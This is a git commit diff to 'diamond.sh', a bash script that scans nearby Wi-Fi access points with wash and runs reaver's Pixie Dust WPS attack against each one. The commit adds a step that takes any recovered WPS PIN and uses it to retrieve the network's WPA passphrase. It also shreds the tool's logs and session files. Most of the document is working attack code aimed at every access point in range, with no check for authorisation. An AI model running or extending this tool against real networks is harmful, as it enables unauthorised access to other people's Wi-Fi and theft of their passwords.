7f0fd2652c3fb065cb40cddecf948eff253d0188
geotropic <100081013+geotropic@users.noreply.github.com>
2022-04-12 01:42:02 -0600

    fixes and improvements
    Fixed log parsing during each attempt so that the PIN matches the AP(instead of printing already found PINs on each attempt). Improved color scheme for readability and added feature so that if the PIN is found the script will try to register the PIN with the AP to obtain the PSK.

--- diamond.sh
+++ diamond.sh
@@ -40,11 +40,11 @@ cleanup() {
 }
 
 trap cleanup SIGINT
-echo -e "[+] Gathering AP data for ${blue}$timeout${esc} seconds.."
+echo -e "[-] Gathering AP data for ${blue}$timeout${esc} seconds.."
 wash -i $1 >> wash.tmp &
 
 if [ "$ra" == "true" ]; then
-	echo -e "[+] Scanning for ${green}Ralink${esc} chipsets only.."
+	echo -e "[!] Scanning for ${green}Ralink${esc} chipsets only.."
 	tail -f wash.tmp | grep 'Ralink' &
 elif [ "$ra" == "false" ]; then
 	tail -f wash.tmp | grep -E '[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}' &
@@ -72,7 +72,7 @@ essid=($(cat wash.txt | tr -s ' ' | cut -d ' ' -f 7))
 
 rm -f wash.txt
 
-if [ "$(ls /var/lib/reaver | grep *.wpc)" ]; then
+if [ "$(ls /var/lib/reaver)" ]; then
 	shred -u /var/lib/reaver/*.wpc
 fi
 
@@ -80,31 +80,34 @@ if [ -f "diamond.log" ]; then
 	shred -u diamond.log
 fi
 
+echo -e "\n[-] ${red}Checking ${#bssid[*]} AP(s) for Pixie WPS Vulnerability..${esc}\n"
+
 for ((x = 0; x < ${#bssid[*]}; x++)); do
 
 	if [ ! "${vendor[x]}" ]; then
 		${vendor[x]}="Unknown"
 	fi
 
-	echo -e "[+] ${red}Checking for Pixie WPS Vulnerability..${esc}"
-	echo -e "[+] ${blue}ESSID:${esc} ${green}${essid[x]}${esc} ${blue}BSSID:${esc} ${green}${bssid[x]}${esc} ${blue}Signal:${esc} ${green}${signal[x]}${esc}" 
-	echo -e "[+] ${blue}Vendor:${esc} ${green}${vendor[x]}${esc} ${blue}Channel:${esc} ${green}${channel[x]}${esc} ${blue}WPS Version:${esc} ${green}${wpsver[x]}${esc} ${blue}WPS Lock:${esc} ${green}${wpslock[x]}${esc}"
+	echo -e "[-] ${blue}ESSID:${esc} ${essid[x]} ${blue}BSSID:${esc} ${bssid[x]} ${blue}Signal:${esc} ${signal[x]}" 
+	echo -e "[-] ${blue}Vendor:${esc} ${vendor[x]} ${blue}Channel:${esc} ${channel[x]} ${blue}WPS Version:${esc} ${wpsver[x]} ${blue}WPS Lock:${esc} ${wpslock[x]}"
 	echo "ESSID: ${essid[x]} BSSID: ${bssid[x]} Channel: ${channel[x]} Vendor: ${vendor[x]}" >> diamond.log 
-	reaver -i $1 -b ${bssid[x]} -K -q 2>&1 >> diamond.log &
-	echo -e "[+] Trying for ${red}$timeout${esc} seconds.."
-	tail -f diamond.log | grep '${bssid[x]}' -A 12 | grep 'WPS pin:' | grep -E '[0-9]{8}' &
+	reaver -i $1 -b ${bssid[x]} -K -q 2>/dev/null >> diamond.log &
+	echo -e "[-] Trying for ${red}$timeout${esc} seconds.."
 	sleep $timeout
-	pkill tail
 	pkill reaver
 
 	if [ ! "$(cat diamond.log | grep ${bssid[x]} -A 12 | grep 'WPS pin:' | grep -E '[0-9]{8}')" ]; then
 		echo -e "[!] ${red}Access point not vulnerable.${esc}\n"
 	elif [ "$(cat diamond.log | grep ${bssid[x]} -A 12 | grep 'WPS pin:' | grep -E '[0-9]{8}')" ]; then
-		echo -e "[!] ${green}Access point vulnerable.${esc} ${red}WPS PIN:${esc} ${uline}$(cat diamond.log | grep ${bssid[x]} -A 12 | grep 'WPS pin:' | grep -Eo '[0-9]{8}')${esc}\n"
+		pin=$(cat diamond.log | grep ${bssid[x]} -A 12 | grep 'WPS pin:' | grep -Eo '[0-9]{8}')
+		echo -e "[!] ${green}Access point vulnerable.${esc}"
+		echo -e "[-] Registering ${red}WPS PIN:${esc} ${uline}$pin${esc} with AP.."
+		psk=$(reaver -i $1 -b ${bssid[x]} -c ${channel[x]} -p $pin 2>/dev/null | grep 'PSK')
+		echo -e "${uline}$psk${esc}\n"
 	fi
 done
 
-echo -e "[+] ${blue}${uline}$0${esc} has finished. Check '${green}${uline}diamond.log${esc}' for details."
+echo -e "[-] ${blue}${uline}$0${esc} has finished. Check '${green}${uline}diamond.log${esc}' for details."
 echo -e "[+] ${green}${uline}diamond.log:${esc}"
 cat diamond.log | grep 'WPS PIN' -A 2
 cat diamond.log | grep 'WPS pin:' -B 12 | grep -E 'ESSID|WPS pin:'
